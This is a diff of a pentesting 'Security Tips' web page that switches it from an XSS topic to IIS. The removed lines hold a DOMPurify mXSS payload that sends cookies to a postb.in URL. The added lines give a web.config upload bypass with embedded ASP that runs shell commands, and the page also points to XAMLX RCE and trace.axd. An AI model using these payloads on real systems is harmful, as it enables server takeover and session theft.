@@ -8,15 +8,15 @@
   
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
-  <title>XSS - Security Tips</title>
+  <title>IIS - Security Tips</title>
   <link rel="stylesheet" href="../css/style.css" type="text/css" />
   <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
   
   <script>
     // Current page data
-    var mkdocs_page_name = "XSS";
-    var mkdocs_page_input_path = "xss.md";
-    var mkdocs_page_url = "/xss/";
+    var mkdocs_page_name = "IIS";
+    var mkdocs_page_input_path = "iis.md";
+    var mkdocs_page_url = "/iis/";
   </script>
   
   <script src="../js/jquery-2.1.1.min.js" defer></script>
@@ -115,22 +115,9 @@
 		        
     <span class="section-link active">Web</span>
     <ul>
-                <li class="active">
+                <li class="">
                     
-    <a class="section-link" href="./">XSS</a>
-    <ul>
-            
-    
-    <ul>
-    
-        <li><a class="" href="#cheat-sheet">Cheat sheet</a></li>
-    
-        <li><a class="" href="#dompurify-20-bypass">DOMPurify 2.0 bypass</a></li>
-    
-    </ul>
-    
-
-    </ul>
+    <a class="section-link" href="../xss/">XSS</a>
                 </li>
                 <li class="">
                     
@@ -156,9 +143,24 @@
                     
     <a class="section-link" href="../jwt/">JWT</a>
                 </li>
-                <li class="">
+                <li class="active">
                     
-    <a class="section-link" href="../iis/">IIS</a>
+    <a class="section-link" href="./">IIS</a>
+    <ul>
+            
+    
+    <ul>
+    
+        <li><a class="" href="#bypass-blacklist-upload">Bypass blacklist upload</a></li>
+    
+        <li><a class="" href="#upload-xamlx-file-to-get-rce">Upload XAMLX file to get RCE</a></li>
+    
+        <li><a class="" href="#tracing">Tracing</a></li>
+    
+    </ul>
+    
+
+    </ul>
                 </li>
     </ul>
           </li>
@@ -235,23 +237,59 @@
         <div role="main">
           <div class="section">
             
-              <h1 id="xss">XSS</h1>
-<h2 id="cheat-sheet">Cheat sheet</h2>
-<p>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</p>
-<h2 id="dompurify-20-bypass">DOMPurify 2.0 bypass</h2>
-<p>https://research.securitum.com/dompurify-bypass-using-mxss/</p>
-<pre><code>http://qual-challs.rtfm.re:8080/?layout=&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a%20id=&quot;&lt;/style&gt;&lt;style&gt;%40keyframes%20slidein%20%7B%7D&lt;%2Fstyle&gt;&lt;a%20style%3D%27animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%27%20onanimationiteration%3Ddocument.location=%27https:%2F%2Fpostb.in%2F1570471277352-2268189566675%2F%27+document.cookie&gt;&lt;%2Fa&gt;%20&quot;&gt;
+              <h1 id="iis">IIS</h1>
+<h2 id="bypass-blacklist-upload">Bypass blacklist upload</h2>
+<p>It's possible to bypass blacklist upload while uploading a <code>web.config</code> file.
+For this, you need to set execution rights to <code>.config</code> and then adding <code>ASP</code> code
+in the <code>web.config</code>.</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+   &lt;system.webServer&gt;
+      &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
+         &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;
+      &lt;/handlers&gt;
+      &lt;security&gt;
+         &lt;requestFiltering&gt;
+            &lt;fileExtensions&gt;
+               &lt;remove fileExtension=&quot;.config&quot; /&gt;
+            &lt;/fileExtensions&gt;
+            &lt;hiddenSegments&gt;
+               &lt;remove segment=&quot;web.config&quot; /&gt;
+            &lt;/hiddenSegments&gt;
+         &lt;/requestFiltering&gt;
+      &lt;/security&gt;
+   &lt;/system.webServer&gt;
+   &lt;appSettings&gt;
+&lt;/appSettings&gt;
+&lt;/configuration&gt;
+&lt;!–-
+&lt;% Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;)
+Response.write(&quot;&lt;pre&gt;&quot;)
+Set wShell1 = CreateObject(&quot;WScript.Shell&quot;)
+Set cmd1 = wShell1.Exec(&quot;whoami&quot;)
+output1 = cmd1.StdOut.Readall()
+set cmd1 = nothing: Set wShell1 = nothing
+Response.write(output1)
+Response.write(&quot;&lt;/pre&gt;&lt;!-&quot;&amp;&quot;-&quot;) %&gt;
+-–&gt;
 </code></pre>
+
+<h2 id="upload-xamlx-file-to-get-rce">Upload XAMLX file to get RCE</h2>
+<p><a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/august/getting-shell-with-xamlx-files/">NCCGroup</a>
+describes how to upload a <code>XAMLX</code> file to execute code on a remote IIS server.</p>
+<h2 id="tracing">Tracing</h2>
+<p><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/ms972204(v=msdn.10)?redirectedfrom=MSDN">Tracing</a>
+might be activate on the server. For example, check <code>/trace.axd</code>.</p>
             
           </div>
           <footer>
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../API/" class="btn btn-neutral float-right" title="API">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../configuration-review/" class="btn btn-neutral float-right" title="Configuration Review">Next <span class="icon icon-circle-arrow-right"></span></a>
       
       
-        <a href="../zip/" class="btn btn-neutral" title="Zip"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../jwt/" class="btn btn-neutral" title="JWT"><span class="icon icon-circle-arrow-left"></span> Previous</a>
       
     </div>
   
@@ -274,10 +312,10 @@
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../zip/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../jwt/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../API/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../configuration-review/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
